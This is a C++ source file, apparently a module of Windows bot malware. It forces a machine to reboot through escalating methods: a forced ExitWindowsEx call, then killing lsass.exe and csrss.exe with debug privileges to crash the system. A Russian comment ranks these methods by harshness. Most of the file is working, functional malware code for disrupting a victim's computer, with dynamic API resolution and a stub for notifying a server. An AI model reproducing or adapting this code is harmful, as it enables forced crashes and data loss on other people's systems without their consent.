#include <windows.h>
#include <tlhelp32.h> 
#include "ntdll.h"

#include "GetApi.h"
#include "Memory.h"
#include "BotUtils.h"

#include "Reboot.h"

#include "BotDebug.h"
#include "DbgRpt.h"

/*
Методы перегрузки в порядке возрастания жёсткости:
- нормальный метод
  - самый мягкий

- прибивание lsas.exe - систаму управления учетными записями
  Более мягкий метод, позволяет пользователю сохранится в течении 1 минуты.

-	прибивание csrss.exe - прибивание исполнительной системы Windows 
	- сразу синее окно
*/

void RebootMethod_Normal()
{
	BOOL     OldValue = FALSE;
	NTSTATUS shutdown_privilege_status = 0;

	shutdown_privilege_status = (NTSTATUS)pRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue);
	PP_RETURNIF1(!NT_SUCCESS(shutdown_privilege_status));

  BOOL exit_windows_result = (BOOL)pExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
	PP_RETURNIF1(exit_windows_result == FALSE);
	
	PP_DPRINTF("RebootMethod_Normal: successfuly finished.");
}

bool KillSystemProcessById(DWORD pid)
{
	PP_DPRINTF("KillSystemProcessById: started with pid=%u", pid);

 	NTSTATUS debug_privilege_status = 0;
	BOOLEAN  old = FALSE;

	PP_DPRINTF("KillSystemProcessById: Getting DEBUG privileges.");
	
	debug_privilege_status = (NTSTATUS)pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old);
	PP_RETURNIF2(!NT_SUCCESS(debug_privilege_status), false);

	HANDLE process_handle = pOpenProcess(PROCESS_TERMINATE, 0, pid);
	PP_RETURNIF2(process_handle == NULL, false);
	
	BOOL kill_result = (BOOL)pTerminateProcess(process_handle, 0);
	
	PP_DPRINTF("KillSystemProcessById: kill process=%u result=%d",pid, kill_result);
	
	pCloseHandle(process_handle);

	return (kill_result == TRUE);
}

typedef bool (*ProcessFilterFunction)(const PROCESSENTRY32W* ppe);


void EnumProcessesWithFilter(ProcessFilterFunction filter, 
	DWORD *pids, DWORD pids_length, DWORD* returned_pid_count)
{
	HANDLE SnapshotHandle = NULL;
	PROCESSENTRY32W ppe;
	DWORD count = 0;

	*returned_pid_count = 0;

	m_memset(&ppe, 0, sizeof(ppe));
	ppe.dwSize=sizeof(PROCESSENTRY32W);

	SnapshotHandle = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PP_RETURNIF1(SnapshotHandle == INVALID_HANDLE_VALUE);

	BOOL success_enum = (BOOL)pProcess32FirstW(SnapshotHandle,&ppe);
	while (success_enum)
	{
		if (filter(&ppe))
		{
      if (count < pids_length)
      {
        pids[count] = ppe.th32ProcessID;
        count++;
      }
		}
		success_enum = (BOOL)pProcess32NextW(SnapshotHandle, &ppe);
	}
	pCloseHandle(SnapshotHandle);
	
	*returned_pid_count = count;
}

bool Filter_Lsass(const PROCESSENTRY32W* ppe)
{
	return (pStrStrIW(ppe->szExeFile, L"lsass.exe") != NULL);
}

bool Filter_Scrss(const PROCESSENTRY32W* ppe)
{
	return (pStrStrIW(ppe->szExeFile, L"csrss.exe") != NULL);
}

void KillByFilter(ProcessFilterFunction filter)
{
	DWORD pids[100];
	DWORD count = 0;

	EnumProcessesWithFilter(filter, pids, ARRAYSIZE(pids), &count);
	for (DWORD i = 0; i < count; i++)
	{
		KillSystemProcessById(pids[i]);
	}
}

void RebootMethod_KillLsass()
{
	KillByFilter(Filter_Lsass);
}

void RebootMethod_KillCsrss()
{
	KillByFilter(Filter_Scrss);
}

void MultiMethodReboot()
{
	typedef void (*RebootMethodFunction)();
	struct 
	{
		const char*						method_id;
		RebootMethodFunction	method_function;
	} method_table[] = 
	{
		{"rbm_01", RebootMethod_Normal},
		{"rbm_02", RebootMethod_KillLsass},
		{"rbm_03", RebootMethod_KillCsrss}
	};

	PP_DPRINTF("MultiMethodReboot: Enum each method and run.");
	for (size_t i=0; i < ARRAYSIZE(method_table); i++)
	{
		RebootMethodFunction reboot = method_table[i].method_function;
		PP_DPRINTF("MultiMethodReboot: try method '%S'", method_table[i].method_id);

		// NotifyServerStepRebootWithMethod()
		reboot();
		
		PP_DPRINTF("MultiMethodReboot: sleeping 3 min");
		Sleep(3 * 60 * 1000);
	}
}
